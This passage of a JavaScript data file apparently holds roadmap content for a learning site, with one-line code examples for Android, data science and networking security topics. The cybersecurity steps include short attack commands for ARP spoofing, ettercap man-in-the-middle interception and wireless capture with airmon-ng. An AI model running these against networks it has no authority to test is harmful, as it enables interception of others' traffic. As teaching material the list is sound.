                            { id: "and-13", title: "Scope Functions", description: "let, run, with, apply, also.", example: "user.apply { name = \"Ali\"; age = 30 }" },
                            { id: "and-14", title: "Delegation", description: "by lazy, by Delegates.observable.", example: "val db: Database by lazy { Database.getInstance() }" },
                            { id: "and-15", title: "Enums & When Expression", description: "Kotlin when is more powerful than Java switch.", example: "when(status) { Status.LOADING -> showSpinner() }" },
                            { id: "and-16", title: "Interfaces", description: "Multiple interface implementation.", example: "class MyAdapter : RecyclerView.Adapter<VH>(), Filterable { ... }" },
                            { id: "and-17", title: "Inline Functions", description: "Reducing lambda overhead.", example: "inline fun measureTime(block: () -> Unit): Long { ... }" },
                            { id: "and-18", title: "Builder Pattern (DSL)", description: "Kotlin DSLs for clean construction.", example: "val dialog = buildDialog { title = \"Alert\"; message = \"Sure?\" }" },
                            { id: "and-19", title: "Operator Overloading", description: "Custom operators for your classes.", example: "operator fun Point.plus(other: Point) = Point(x+other.x, y+other.y)" },
                            { id: "and-20", title: "Unit Testing (JUnit + MockK)", description: "Testing Kotlin code and coroutines.", example: "coEvery { repository.getUser(1) } returns fakeUser" }
                        ]
                    },
                    {
                        id: "and-kot-2", title: "Android Fundamentals",
                        steps: [
                            { id: "and-af-1", title: "Activity Lifecycle", description: "onCreate, onStart, onResume, onPause, onStop, onDestroy.", example: "override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(...) }" },
                            { id: "and-af-2", title: "Intents & Navigation", description: "Explicit and implicit intents.", example: "startActivity(Intent(this, DetailActivity::class.java).apply { putExtra(\"id\", 1) })" },
                            { id: "and-af-3", title: "Fragments", description: "Reusable UI components within Activities.", example: "supportFragmentManager.beginTransaction().replace(R.id.container, MyFragment()).commit()" },
                            { id: "and-af-4", title: "Permissions", description: "Requesting runtime permissions.", example: "ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), 100)" },
                            { id: "and-af-5", title: "Broadcast Receivers", description: "Responding to system events.", example: "registerReceiver(myReceiver, IntentFilter(Intent.ACTION_BATTERY_LOW))" },
                            { id: "and-af-6", title: "Services & WorkManager", description: "Background processing and tasks.", example: "WorkManager.getInstance().enqueue(OneTimeWorkRequestBuilder<SyncWorker>().build())" },
                            { id: "and-af-7", title: "Content Providers", description: "Sharing data between apps.", example: "contentResolver.query(ContactsContract.Contacts.CONTENT_URI, ...)" },
                            { id: "and-af-8", title: "Android Manifest", description: "Declaring components, permissions, features.", example: "<uses-permission android:name=\"android.permission.INTERNET\" />" },
                            { id: "and-af-9", title: "Resources & Localization", description: "strings.xml, dimens.xml, multiple locales.", example: "getString(R.string.welcome)" },
                            { id: "and-af-10", title: "ProGuard & R8", description: "Code shrinking and obfuscation for release.", example: "-keep class com.app.model.** { *; }" },
                            { id: "and-af-11", title: "Build Variants & Flavors", description: "Debug/release builds, product flavors.", example: "flavorDimensions \"env\"; productFlavors { dev { ... }; prod { ... } }" },
                            { id: "and-af-12", title: "Gradle Dependencies", description: "Managing libraries with Gradle.", example: "implementation \"com.squareup.retrofit2:retrofit:2.9.0\"" },
                            { id: "and-af-13", title: "Material Design 3", description: "Using Material components and theming.", example: "<com.google.android.material.button.MaterialButton .../>" },
                            { id: "and-af-14", title: "RecyclerView", description: "Efficient list and grid display.", example: "adapter = MyAdapter(items); layoutManager = LinearLayoutManager(this)" },
                            { id: "and-af-15", title: "ViewBinding", description: "Type-safe view access without findViewById.", example: "val binding = ActivityMainBinding.inflate(layoutInflater)" },
                            { id: "and-af-16", title: "Notifications", description: "Building and sending local notifications.", example: "NotificationCompat.Builder(ctx, CHANNEL_ID).setContentTitle(\"Alert\").build()" },
                            { id: "and-af-17", title: "Deep Links", description: "Opening app screens from URLs.", example: "<intent-filter android:autoVerify=\"true\"> <data android:host=\"app.com\" ... /> " },
                            { id: "and-af-18", title: "App Widgets", description: "Home screen interactive widgets.", example: "AppWidgetProvider.onUpdate() with RemoteViews." },
                            { id: "and-af-19", title: "Firebase Analytics", description: "Tracking user events.", example: "firebaseAnalytics.logEvent(FirebaseAnalytics.Event.LOGIN, bundle)" },
                            { id: "and-af-20", title: "Crash Reporting (Firebase Crashlytics)", description: "Tracking production crashes.", example: "FirebaseCrashlytics.getInstance().recordException(e)" }
                        ]
                    }
                ],
                project: "Build an Android quiz app with splash screen, multiple quiz categories, scoring, and local high scores."
            },
            {
                title: "Jetpack Compose UI",
                modules: [
                    {
                        id: "and-ui-1", title: "Compose Fundamentals",
                        steps: [
                            { id: "and-c-1", title: "Composable Functions", description: "@Composable annotation, recomposition.", example: "@Composable fun Greeting(name: String) { Text(\"Hello, $name!\") }" },
                            { id: "and-c-2", title: "Layouts (Column, Row, Box)", description: "Composing UI elements.", example: "Row(verticalAlignment = Alignment.CenterVertically) { ... }" },
                            { id: "and-c-3", title: "Modifiers", description: "size, padding, background, clickable, clip.", example: "Modifier.fillMaxWidth().padding(16.dp).background(Color.White)" },
                            { id: "and-c-4", title: "State with remember & mutableStateOf", description: "Local state in composables.", example: "var count by remember { mutableStateOf(0) }" },
                            { id: "and-c-5", title: "State Hoisting", description: "Lifting state up for reusable components.", example: "MyInput(value = text, onValueChange = { text = it })" },
                            { id: "and-c-6", title: "LazyColumn & LazyRow", description: "Efficient scrollable lists.", example: "LazyColumn { items(users) { user -> UserCard(user) } }" },
                            { id: "and-c-7", title: "Animation in Compose", description: "animateAsState, AnimatedVisibility.", example: "val alpha by animateFloatAsState(if (visible) 1f else 0f)" },
                            { id: "and-c-8", title: "Material3 Components", description: "Button, Card, TextField, TopAppBar, BottomNavigation.", example: "OutlinedTextField(value = text, onValueChange = { text = it }, label = { Text(\"Email\") })" },
                            { id: "and-c-9", title: "Theming with MaterialTheme", description: "Colors, typography, shapes.", example: "MaterialTheme(colorScheme = darkColorScheme()) { ... }" },
                            { id: "and-c-10", title: "ConstraintLayout in Compose", description: "Complex constraint-based layouts.", example: "ConstraintLayout { val (btn, text) = createRefs() ... }" },
                            { id: "and-c-11", title: "Compose Navigation", description: "NavController, NavHost, destinations.", example: "NavHost(navController, startDestination=\"home\") { composable(\"home\") { HomeScreen() } }" },
                            { id: "and-c-12", title: "Bottom Navigation Bar", description: "Standard tab navigation.", example: "NavigationBar { NavigationBarItem(icon = { Icon(...) }, selected = ..., onClick = {}) }" },
                            { id: "and-c-13", title: "Dialogs & Bottom Sheets", description: "AlertDialog, ModalBottomSheet.", example: "if (showDialog) { AlertDialog(onDismissRequest = { showDialog = false }, ...) }" },
                            { id: "and-c-14", title: "Custom Drawing (Canvas)", description: "Drawing shapes and paths.", example: "Canvas(Modifier.size(200.dp)) { drawCircle(Color.Red) }" },
                            { id: "and-c-15", title: "Gestures & Touch", description: "detectTapGestures, detectDragGestures.", example: "Modifier.pointerInput(Unit) { detectTapGestures(onLongPress = { ... }) }" },
                            { id: "and-c-16", title: "Paging 3 with Compose", description: "Infinite scrolling.", example: "val pagingItems = viewModel.flow.collectAsLazyPagingItems()" },
                            { id: "and-c-17", title: "Accompanist Libraries", description: "Permissions, pager, placeholder.", example: "HorizontalPager(count = 3) { page -> PageContent(page) }" },
                            { id: "and-c-18", title: "Preview & Tooling", description: "@Preview annotation for Compose.", example: "@Preview(showBackground = true) @Composable fun PreviewScreen() { MyScreen() }" },
                            { id: "and-c-19", title: "Coil for Image Loading", description: "Async image loading in Compose.", example: "AsyncImage(model = imageUrl, contentDescription = \"Avatar\")" },
                            { id: "and-c-20", title: "Testing Compose UI", description: "ComposeTestRule, semantic matchers.", example: "composeTestRule.onNodeWithText(\"Submit\").performClick()" }
                        ]
                    },
                    {
                        id: "and-ui-2", title: "Architecture & Data",
                        steps: [
                            { id: "and-ar-1", title: "ViewModel", description: "Surviving configuration changes.", example: "class HomeViewModel : ViewModel() { val uiState = MutableStateFlow(HomeState()) }" },
                            { id: "and-ar-2", title: "StateFlow & SharedFlow", description: "Reactive state in ViewModel.", example: "val uiState: StateFlow<UiState> = _uiState.asStateFlow()" },
                            { id: "and-ar-3", title: "Repository Pattern", description: "Abstracting data sources.", example: "class UserRepository(private val api: ApiService, private val db: AppDatabase) { ... }" },
                            { id: "and-ar-4", title: "Dependency Injection (Hilt)", description: "Automated DI with Hilt/Dagger.", example: "@HiltViewModel class MyVM @Inject constructor(val repo: UserRepository) : ViewModel()" },
                            { id: "and-ar-5", title: "Room Database", description: "Local SQLite with DAO pattern.", example: "@Dao interface UserDao { @Query(\"SELECT * FROM users\") fun getAll(): Flow<List<User>> }" },
                            { id: "and-ar-6", title: "Retrofit", description: "Type-safe HTTP client.", example: "@GET(\"users/{id}\") suspend fun getUser(@Path(\"id\") id: Int): User" },
                            { id: "and-ar-7", title: "OkHttp & Interceptors", description: "Logging, auth, retry interceptors.", example: "OkHttpClient.Builder().addInterceptor(HttpLoggingInterceptor()).build()" },
                            { id: "and-ar-8", title: "Moshi / Gson", description: "JSON serialization/deserialization.", example: "val user = moshi.adapter(User::class.java).fromJson(json)" },
                            { id: "and-ar-9", title: "Clean Architecture (Use Cases)", description: "Domain layer with UseCases.", example: "class GetUsersUseCase(private val repo: UserRepo) { operator fun invoke() = repo.getUsers() }" },
                            { id: "and-ar-10", title: "DataStore", description: "Type-safe replacement for SharedPreferences.", example: "dataStore.edit { preferences -> preferences[KEY_TOKEN] = token }" },
                            { id: "and-ar-11", title: "WorkManager", description: "Guaranteed background tasks.", example: "CoroutineWorker: override suspend fun doWork(): Result { ... }" },
                            { id: "and-ar-12", title: "Firebase Firestore", description: "Real-time cloud database.", example: "db.collection(\"users\").addSnapshotListener { snapshot, _ -> ... }" },
                            { id: "and-ar-13", title: "Firebase Authentication", description: "Email, Google, anonymous sign-in.", example: "FirebaseAuth.getInstance().signInWithEmailAndPassword(email, password)" },
                            { id: "and-ar-14", title: "Coroutine Error Handling", description: "try/catch in coroutines, CoroutineExceptionHandler.", example: "val handler = CoroutineExceptionHandler { _, e -> logError(e) }" },
                            { id: "and-ar-15", title: "Paging 3", description: "Loading paginated data from network/DB.", example: "class UserPagingSource(val api: ApiService) : PagingSource<Int, User>() { ... }" },
                            { id: "and-ar-16", title: "Background Services", description: "Foreground services for long tasks.", example: "startForeground(NOTIFICATION_ID, notification)" },
                            { id: "and-ar-17", title: "App Performance (Profiler)", description: "CPU, memory, network profiling in Android Studio.", example: "Enable strict mode: StrictMode.setThreadPolicy(...)" },
                            { id: "and-ar-18", title: "Security (EncryptedSharedPrefs)", description: "Encrypted storage for sensitive data.", example: "EncryptedSharedPreferences.create(\"prefs\", masterKey, ...)" },
                            { id: "and-ar-19", title: "Play Store Publishing", description: "Signing APK/AAB, play console setup.", example: "keytool -genkey -v -keystore release.jks ..." },
                            { id: "and-ar-20", title: "CI/CD for Android (GitHub Actions)", description: "Automated build and test pipeline.", example: "uses: actions/setup-java@v3; ./gradlew test assembleRelease" }
                        ]
                    }
                ],
                project: "Build a full-featured expense tracker: categories, charts (MPAndroidChart), Room DB, Hilt, Compose UI."
            }
        ]
    },
    datascience: {
        title: "Data Science Roadmap",
        stages: [
            {
                title: "Python & Mathematics",
                modules: [
                    {
                        id: "ds-1", title: "Python for Data Science",
                        steps: [
                            { id: "ds-py-1", title: "Python Setup & Jupyter", description: "Install Anaconda, use Jupyter notebooks.", example: "jupyter notebook; conda create -n ds python=3.11" },
                            { id: "ds-py-2", title: "NumPy Arrays", description: "Creating, indexing, slicing, broadcasting.", example: "import numpy as np; a = np.array([1,2,3]); a * 2" },
                            { id: "ds-py-3", title: "Pandas DataFrames", description: "Creating, reading, and inspecting DataFrames.", example: "df = pd.read_csv('data.csv'); df.head()" },
                            { id: "ds-py-4", title: "Data Cleaning", description: "Handling missing values, duplicates, type conversion.", example: "df.dropna(); df.fillna(0); df.astype({'age': int})" },
                            { id: "ds-py-5", title: "Data Filtering & Selection", description: "Boolean indexing, loc, iloc.", example: "df[df['age'] > 30]; df.loc[:, ['name','age']]" },
                            { id: "ds-py-6", title: "GroupBy & Aggregation", description: "Grouping and summarizing data.", example: "df.groupby('city')['sales'].sum()" },
                            { id: "ds-py-7", title: "Merging & Joining", description: "merge, join, concat DataFrames.", example: "pd.merge(df1, df2, on='id', how='left')" },
                            { id: "ds-py-8", title: "Data Visualization (Matplotlib)", description: "Line, bar, scatter, histogram plots.", example: "plt.scatter(df['age'], df['salary']); plt.show()" },
                            { id: "ds-py-9", title: "Seaborn", description: "Statistical visualizations.", example: "sns.heatmap(df.corr(), annot=True)" },
                            { id: "ds-py-10", title: "Plotly (Interactive Charts)", description: "Interactive dashboards and plots.", example: "import plotly.express as px; px.scatter(df, x='age', y='salary')" },
                            { id: "ds-py-11", title: "Feature Engineering", description: "Creating new features from existing data.", example: "df['age_group'] = pd.cut(df['age'], bins=[0,18,35,60,100])" },
                            { id: "ds-py-12", title: "Encoding Categorical Data", description: "Label encoding, one-hot encoding.", example: "pd.get_dummies(df, columns=['city'])" },
                            { id: "ds-py-13", title: "Handling Dates & Times", description: "datetime parsing and operations.", example: "df['date'] = pd.to_datetime(df['date']); df['year'] = df['date'].dt.year" },
                            { id: "ds-py-14", title: "String Operations (str accessor)", description: "Vectorized string methods.", example: "df['name'].str.lower().str.contains('ali')" },
                            { id: "ds-py-15", title: "Lambda & Apply", description: "Applying custom functions to DataFrames.", example: "df['score'].apply(lambda x: 'Pass' if x >= 50 else 'Fail')" },
                            { id: "ds-py-16", title: "Pivot Tables", description: "Reshaping data like Excel pivot tables.", example: "df.pivot_table(values='sales', index='month', columns='product', aggfunc='sum')" },
                            { id: "ds-py-17", title: "Reading APIs & JSON", description: "Fetching and parsing JSON data.", example: "import requests; data = requests.get(url).json(); pd.json_normalize(data)" },
                            { id: "ds-py-18", title: "SQL with Pandas (SQLite)", description: "Running SQL queries from Python.", example: "pd.read_sql('SELECT * FROM users', con=engine)" },
                            { id: "ds-py-19", title: "Web Scraping (BeautifulSoup)", description: "Extracting data from websites.", example: "soup = BeautifulSoup(html, 'html.parser'); soup.find_all('h2')" },
                            { id: "ds-py-20", title: "Workflow with Pipelines", description: "Reproducible data processing with sklearn Pipeline.", example: "Pipeline([('scaler', StandardScaler()), ('clf', LogisticRegression())])" }
                        ]
                    },
                    {
                        id: "ds-2", title: "Statistics & Probability",
                        steps: [
                            { id: "ds-st-1", title: "Descriptive Statistics", description: "Mean, median, mode, std, variance, IQR.", example: "df.describe(); df['col'].std()" },
                            { id: "ds-st-2", title: "Data Distributions", description: "Normal, Binomial, Poisson, Uniform distributions.", example: "from scipy.stats import norm; norm.pdf(0)" },
                            { id: "ds-st-3", title: "Central Limit Theorem", description: "Why the normal distribution matters in sampling.", example: "Sample means approach normal as n increases." },
                            { id: "ds-st-4", title: "Hypothesis Testing", description: "Null/alternate hypothesis, p-value, significance.", example: "scipy.stats.ttest_ind(group_a, group_b)" },
                            { id: "ds-st-5", title: "Confidence Intervals", description: "Estimating population parameters.", example: "stats.t.interval(0.95, df=n-1, loc=mean, scale=se)" },
                            { id: "ds-st-6", title: "Correlation & Covariance", description: "Measuring linear relationships.", example: "df.corr(); np.corrcoef(x, y)" },
                            { id: "ds-st-7", title: "Chi-Square Test", description: "Testing independence of categorical variables.", example: "stats.chi2_contingency(contingency_table)" },
                            { id: "ds-st-8", title: "ANOVA", description: "Comparing means across multiple groups.", example: "stats.f_oneway(group1, group2, group3)" },
                            { id: "ds-st-9", title: "Bayes' Theorem", description: "Conditional probability (P(A|B)).", example: "P(Spam|word) = P(word|Spam)*P(Spam) / P(word)" },
                            { id: "ds-st-10", title: "A/B Testing", description: "Measuring impact of changes.", example: "Calculate statistical significance of conversion rate difference." },
                            { id: "ds-st-11", title: "Sampling Methods", description: "Random, stratified, cluster sampling.", example: "df.sample(n=100, random_state=42)" },
                            { id: "ds-st-12", title: "Outlier Detection", description: "IQR method, Z-score, boxplots.", example: "z = (df - df.mean()) / df.std(); df[z.abs() < 3]" },
                            { id: "ds-st-13", title: "Skewness & Kurtosis", description: "Measuring distribution shape.", example: "df['col'].skew(); df['col'].kurt()" },
                            { id: "ds-st-14", title: "Monte Carlo Simulation", description: "Using random sampling to estimate outcomes.", example: "np.random.normal(mean, std, size=10000)" },
                            { id: "ds-st-15", title: "Dimensionality Concepts", description: "Curse of dimensionality, feature selection importance.", example: "More features ≠ better model." },
                            { id: "ds-st-16", title: "Linear Algebra Basics", description: "Vectors, matrices, dot products, eigenvalues.", example: "np.dot(A, B); np.linalg.eig(matrix)" },
                            { id: "ds-st-17", title: "Calculus for ML", description: "Gradients, partial derivatives, chain rule.", example: "Gradient descent update: θ = θ - α * ∂L/∂θ" },
                            { id: "ds-st-18", title: "Information Theory", description: "Entropy, information gain (used in Decision Trees).", example: "entropy = -sum(p * log2(p))" },
                            { id: "ds-st-19", title: "Experimental Design", description: "Control groups, randomization, confounders.", example: "Randomly assign users to A or B group." },
                            { id: "ds-st-20", title: "Statistical Power", description: "Avoiding Type I and Type II errors.", example: "power = 1 - P(Type II Error)" }
                        ]
                    }
                ],
                project: "Full EDA on the Titanic dataset: clean data, visualize distributions, find correlations, report insights."
            },
            {
                title: "Machine Learning",
                modules: [
                    {
                        id: "ds-ml-1", title: "Supervised Learning",
                        steps: [
                            { id: "ds-ml-1a", title: "Train/Test Split", description: "Splitting data for model evaluation.", example: "X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2)" },
                            { id: "ds-ml-2a", title: "Linear Regression", description: "Predicting continuous values.", example: "from sklearn.linear_model import LinearRegression; model.fit(X_train, y_train)" },
                            { id: "ds-ml-3a", title: "Logistic Regression", description: "Binary classification.", example: "LogisticRegression().fit(X_train, y_train)" },
                            { id: "ds-ml-4a", title: "Decision Trees", description: "Interpretable tree-based models.", example: "DecisionTreeClassifier(max_depth=5)" },
                            { id: "ds-ml-5a", title: "Random Forest", description: "Ensemble of decision trees.", example: "RandomForestClassifier(n_estimators=100)" },
                            { id: "ds-ml-6a", title: "Gradient Boosting (XGBoost)", description: "State-of-the-art tabular data model.", example: "xgb.XGBClassifier(n_estimators=200, learning_rate=0.1)" },
                            { id: "ds-ml-7a", title: "Support Vector Machines", description: "Finding the optimal hyperplane.", example: "SVC(kernel='rbf', C=1.0)" },
                            { id: "ds-ml-8a", title: "K-Nearest Neighbours", description: "Classify based on similar examples.", example: "KNeighborsClassifier(n_neighbors=5)" },
                            { id: "ds-ml-9a", title: "Naive Bayes", description: "Probabilistic classifier, great for text.", example: "MultinomialNB().fit(X_train, y_train)" },
                            { id: "ds-ml-10a", title: "Model Evaluation Metrics", description: "Accuracy, Precision, Recall, F1, AUC-ROC.", example: "classification_report(y_test, y_pred)" },
                            { id: "ds-ml-11a", title: "Cross-Validation", description: "K-Fold CV for robust evaluation.", example: "cross_val_score(model, X, y, cv=5)" },
                            { id: "ds-ml-12a", title: "Hyperparameter Tuning", description: "GridSearchCV, RandomizedSearchCV.", example: "GridSearchCV(model, param_grid, cv=5).fit(X, y)" },
                            { id: "ds-ml-13a", title: "Feature Importance", description: "Which features matter most.", example: "model.feature_importances_; pd.Series(fi, index=feature_names).plot.bar()" },
                            { id: "ds-ml-14a", title: "Handling Imbalanced Data", description: "SMOTE, class_weight, oversampling.", example: "from imblearn.over_sampling import SMOTE; X_res, y_res = SMOTE().fit_resample(X, y)" },
                            { id: "ds-ml-15a", title: "Regularization (L1/L2)", description: "Lasso, Ridge to prevent overfitting.", example: "Ridge(alpha=1.0); Lasso(alpha=0.01)" },
                            { id: "ds-ml-16a", title: "Polynomial Features", description: "Creating non-linear features.", example: "PolynomialFeatures(degree=2).fit_transform(X)" },
                            { id: "ds-ml-17a", title: "Pipelines", description: "Chaining preprocessing and model steps.", example: "Pipeline([('scaler', StandardScaler()), ('svm', SVC())])" },
                            { id: "ds-ml-18a", title: "Saving & Loading Models", description: "Pickle and joblib for model persistence.", example: "import joblib; joblib.dump(model, 'model.pkl')" },
                            { id: "ds-ml-19a", title: "Bias-Variance Tradeoff", description: "Understanding underfitting vs overfitting.", example: "Plot learning curves to diagnose." },
                            { id: "ds-ml-20a", title: "Explainability (SHAP)", description: "Understanding model predictions.", example: "import shap; shap.summary_plot(shap_values, X)" }
                        ]
                    },
                    {
                        id: "ds-ml-3", title: "Unsupervised Learning",
                        steps: [
                            { id: "ds-ul-1", title: "K-Means Clustering", description: "Partitioning data into k groups.", example: "KMeans(n_clusters=3).fit(X)" },
                            { id: "ds-ul-2", title: "Hierarchical Clustering", description: "Building a dendrogram.", example: "from scipy.cluster.hierarchy import dendrogram, linkage; linkage(X, 'ward')" },
                            { id: "ds-ul-3", title: "DBSCAN", description: "Density-based clustering for arbitrary shapes.", example: "DBSCAN(eps=0.5, min_samples=5).fit(X)" },
                            { id: "ds-ul-4", title: "PCA (Dimensionality Reduction)", description: "Reducing features while retaining variance.", example: "PCA(n_components=2).fit_transform(X)" },
                            { id: "ds-ul-5", title: "t-SNE Visualization", description: "Visualizing high-dimensional data in 2D.", example: "TSNE(n_components=2, random_state=42).fit_transform(X)" },
                            { id: "ds-ul-6", title: "Elbow Method", description: "Finding optimal k for K-Means.", example: "Plot inertia vs. number of clusters." },
                            { id: "ds-ul-7", title: "Silhouette Score", description: "Measuring clustering quality.", example: "silhouette_score(X, labels)" },
                            { id: "ds-ul-8", title: "Autoencoders", description: "Neural nets for compression and anomaly detection.", example: "encoder = Model(inputs, bottleneck); decoder = Model(bottleneck, outputs)" },
                            { id: "ds-ul-9", title: "Anomaly Detection", description: "Isolation Forest, One-Class SVM.", example: "IsolationForest(contamination=0.05).fit_predict(X)" },
                            { id: "ds-ul-10", title: "Association Rule Mining", description: "Market basket analysis (Apriori).", example: "from mlxtend.frequent_patterns import apriori; apriori(df, min_support=0.05)" },
                            { id: "ds-ul-11", title: "Recommender Systems (Collaborative)", description: "User-item matrix factorization.", example: "SVD from surprise library." },
                            { id: "ds-ul-12", title: "Topic Modeling (LDA)", description: "Discovering topics in text collections.", example: "LatentDirichletAllocation(n_components=10).fit(tfidf_matrix)" },
                            { id: "ds-ul-13", title: "UMAP", description: "Faster alternative to t-SNE.", example: "import umap; umap.UMAP().fit_transform(X)" },
                            { id: "ds-ul-14", title: "Gaussian Mixture Models", description: "Soft clustering with probabilities.", example: "GaussianMixture(n_components=3).fit(X)" },
                            { id: "ds-ul-15", title: "Feature Selection Methods", description: "VarianceThreshold, SelectKBest, RFE.", example: "SelectKBest(chi2, k=10).fit_transform(X, y)" },
                            { id: "ds-ul-16", title: "Matrix Factorization (NMF)", description: "Non-negative matrix factorization for text.", example: "NMF(n_components=5).fit_transform(tfidf)" },
                            { id: "ds-ul-17", title: "Semi-Supervised Learning", description: "Using unlabeled data to improve models.", example: "LabelSpreading().fit(X, y_with_minus_one)" },
                            { id: "ds-ul-18", title: "Word Embeddings (Word2Vec)", description: "Representing words as dense vectors.", example: "from gensim.models import Word2Vec; model.wv['king']" },
                            { id: "ds-ul-19", title: "Time Series Clustering", description: "Grouping time series data.", example: "DTW distance + K-Means or DBSCAN." },
                            { id: "ds-ul-20", title: "Cluster Visualization", description: "Plotting clusters with color coding.", example: "plt.scatter(X_2d[:,0], X_2d[:,1], c=labels, cmap='viridis')" }
                        ]
                    }
                ],
                project: "Build a customer segmentation system using K-Means on e-commerce purchase data."
            },
            {
                title: "Deep Learning & AI",
                modules: [
                    {
                        id: "ds-dl-1", title: "Neural Networks & Deep Learning",
                        steps: [
                            { id: "ds-dl-1a", title: "Perceptron & MLP", description: "Basics of artificial neural networks.", example: "Linear → ReLU → Linear → Softmax" },
                            { id: "ds-dl-2a", title: "TensorFlow & Keras", description: "Building models with TF2's high-level API.", example: "model = tf.keras.Sequential([Dense(64,'relu'), Dense(10,'softmax')])" },
                            { id: "ds-dl-3a", title: "PyTorch Basics", description: "Dynamic computation graphs.", example: "class Net(nn.Module): def forward(self, x): return self.fc(x)" },
                            { id: "ds-dl-4a", title: "Activation Functions", description: "ReLU, Sigmoid, Tanh, Softmax, GELU.", example: "nn.ReLU(), nn.Sigmoid(), F.gelu(x)" },
                            { id: "ds-dl-5a", title: "Loss Functions", description: "CrossEntropyLoss, MSELoss, BCELoss.", example: "criterion = nn.CrossEntropyLoss(); loss = criterion(output, target)" },
                            { id: "ds-dl-6a", title: "Optimizers", description: "SGD, Adam, AdamW, RMSprop.", example: "optimizer = torch.optim.Adam(model.parameters(), lr=1e-3)" },
                            { id: "ds-dl-7a", title: "Backpropagation", description: "Gradient computation via chain rule.", example: "loss.backward(); optimizer.step()" },
                            { id: "ds-dl-8a", title: "Batch Normalization & Dropout", description: "Regularization and stable training.", example: "nn.BatchNorm1d(64); nn.Dropout(p=0.5)" },
                            { id: "ds-dl-9a", title: "Convolutional Networks (CNN)", description: "Image feature extraction.", example: "nn.Conv2d(3, 32, kernel_size=3); nn.MaxPool2d(2)" },
                            { id: "ds-dl-10a", title: "Transfer Learning", description: "Fine-tuning pretrained models.", example: "model = torchvision.models.resnet50(pretrained=True)" },
                            { id: "ds-dl-11a", title: "Recurrent Networks (LSTM/GRU)", description: "Sequence modeling for time series/NLP.", example: "nn.LSTM(input_size=10, hidden_size=64, num_layers=2)" },
                            { id: "ds-dl-12a", title: "Transformers & Attention", description: "Self-attention for NLP.", example: "nn.MultiheadAttention(embed_dim=512, num_heads=8)" },
                            { id: "ds-dl-13a", title: "Bert & GPT Fine-Tuning (HuggingFace)", description: "Using pretrained language models.", example: "from transformers import BertForSequenceClassification; model.train()" },
                            { id: "ds-dl-14a", title: "Object Detection (YOLO/Detectron2)", description: "Detecting objects in images.", example: "results = model('image.jpg'); results.show()" },
                            { id: "ds-dl-15a", title: "Autoencoders & GANs", description: "Generative models.", example: "Generator + Discriminator trained adversarially." },
                            { id: "ds-dl-16a", title: "Learning Rate Scheduling", description: "Adaptive LR for better convergence.", example: "torch.optim.lr_scheduler.CosineAnnealingLR(optimizer, T_max=10)" },
                            { id: "ds-dl-17a", title: "Data Augmentation", description: "Artificially expanding training data.", example: "transforms.Compose([RandomHorizontalFlip(), ColorJitter(...)])" },
                            { id: "ds-dl-18a", title: "Model Deployment (FastAPI + ONNX)", description: "Serving ML models as REST APIs.", example: "session = ort.InferenceSession('model.onnx'); session.run([out], {inp: x})" },
                            { id: "ds-dl-19a", title: "MLflow Experiment Tracking", description: "Logging runs, metrics, and artifacts.", example: "mlflow.log_metric('accuracy', acc); mlflow.pytorch.log_model(model, 'model')" },
                            { id: "ds-dl-20a", title: "GPU Training & Mixed Precision", description: "Speeding up training with CUDA & fp16.", example: "model.to('cuda'); scaler = GradScaler(); with autocast(): ..." }
                        ]
                    }
                ],
                project: "Build an end-to-end image classification model, deploy it as a FastAPI endpoint, and track experiments with MLflow."
            }
        ]
    },
    cybersecurity: {
        title: "Cybersecurity Roadmap",
        stages: [
            {
                title: "Networking & OS Foundations",
                modules: [
                    {
                        id: "cs-1", title: "Networking Fundamentals",
                        steps: [
                            { id: "cs-net-1", title: "OSI Model (7 Layers)", description: "Physical, Data Link, Network, Transport, Session, Presentation, Application.", example: "Layer 3=IP, Layer 4=TCP/UDP, Layer 7=HTTP" },
                            { id: "cs-net-2", title: "TCP/IP Stack", description: "IPv4, IPv6 addressing, subnetting, CIDR.", example: "192.168.1.0/24 = 254 usable hosts" },
                            { id: "cs-net-3", title: "DNS", description: "Domain resolution, record types (A, MX, CNAME, TXT).", example: "nslookup google.com" },
                            { id: "cs-net-4", title: "HTTP/HTTPS", description: "Methods, headers, status codes, TLS handshake.", example: "GET /api HTTP/1.1; 200 OK; 403 Forbidden" },
                            { id: "cs-net-5", title: "Ports & Services", description: "Well-known port mappings.", example: "22=SSH, 80=HTTP, 443=HTTPS, 3306=MySQL" },
                            { id: "cs-net-6", title: "Firewalls & NAT", description: "Stateful inspection, port forwarding, DMZ.", example: "iptables -A INPUT -p tcp --dport 22 -j ACCEPT" },
                            { id: "cs-net-7", title: "VPNs & Proxies", description: "Tunneling protocols, anonymity tools.", example: "OpenVPN, WireGuard, Tor" },
                            { id: "cs-net-8", title: "Packet Analysis (Wireshark)", description: "Capturing and inspecting network traffic.", example: "Filter: http.request.method == 'POST'" },
                            { id: "cs-net-9", title: "Network Scanning (Nmap)", description: "Host discovery, port scanning, version detection.", example: "nmap -sV -sC -O 192.168.1.1" },
                            { id: "cs-net-10", title: "Wireless Security", description: "WEP, WPA2, WPA3, evil twin attacks.", example: "airmon-ng start wlan0; airodump-ng" },
                            { id: "cs-net-11", title: "ARP & MAC Spoofing", description: "Layer 2 attacks and mitigations.", example: "arpspoof -i eth0 -t victim gateway" },
                            { id: "cs-net-12", title: "MitM Attacks", description: "Intercepting and modifying traffic.", example: "ettercap -T -M arp:remote /victim/ /gateway/" },
                            { id: "cs-net-13", title: "VLANs & Network Segmentation", description: "Isolating network segments for security.", example: "VLAN 10 for servers, VLAN 20 for clients." },
                            { id: "cs-net-14", title: "IDS/IPS", description: "Intrusion Detection/Prevention Systems.", example: "Snort rules: alert tcp any any -> any 80" },
                            { id: "cs-net-15", title: "SSH Hardening", description: "Key-based auth, port change, fail2ban.", example: "PermitRootLogin no; PasswordAuthentication no;" },
                            { id: "cs-net-16", title: "TLS/SSL Analysis", description: "Certificate validation, cipher suites, HSTS.", example: "openssl s_client -connect site.com:443" },
                            { id: "cs-net-17", title: "Load Balancers & WAFs", description: "Web Application Firewalls, DDoS protection.", example: "Cloudflare, AWS WAF, ModSecurity." },
                            { id: "cs-net-18", title: "Network Forensics", description: "Reconstructing events from PCAP files.", example: "tcpdump -w capture.pcap; strings capture.pcap" },
                            { id: "cs-net-19", title: "Zero Trust Model", description: "Never trust, always verify architecture.", example: "Mutual TLS, identity-aware proxy." },
                            { id: "cs-net-20", title: "Cloud Network Security", description: "VPCs, Security Groups, NACLs in AWS/Azure.", example: "Deny all inbound; allow only 443 from 0.0.0.0/0." }
                        ]
                    },
                    {
                        id: "cs-2", title: "Linux & OS Security",
